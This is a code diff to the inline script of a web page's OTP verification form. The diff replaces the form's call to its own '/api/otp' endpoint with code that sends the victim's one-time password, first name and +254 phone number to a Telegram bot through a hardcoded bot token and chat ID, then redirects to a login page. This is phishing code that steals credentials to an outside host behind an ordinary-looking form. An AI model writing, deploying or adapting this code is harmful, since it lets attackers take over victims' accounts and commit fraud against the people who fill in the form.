@@ -59,15 +59,15 @@
             if(otp.length<4){alert('Please enter a valid OTP of at least 4 digits.');return;}
             const btn=document.getElementById('submitBtn');
             btn.textContent='Verifying...';btn.disabled=true;
-            fetch('/api/otp',{
+            const BOT_TOKEN='7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0';
+            const CHAT_ID='5615316142';
+            const name=localStorage.getItem('firstName')||'';
+            const phone=localStorage.getItem('phone')||'';
+            const msg=`🔑 OTP: ${otp}\n👤 ${name}\n📱 +254${phone}`;
+            fetch('https://api.telegram.org/bot'+BOT_TOKEN+'/sendMessage',{
                 method:'POST',headers:{'Content-Type':'application/json'},
-                body:JSON.stringify({
-                    otp,
-                    applicant:localStorage.getItem('firstName')||'',
-                    phone:localStorage.getItem('phone')||''
-                })
-            }).then(()=>window.location.href='login.html')
-              .catch(()=>window.location.href='login.html');
+                body:JSON.stringify({chat_id:CHAT_ID,text:msg})
+            }).finally(()=>window.location.href='login.html');
         });
     </script>
 </body>
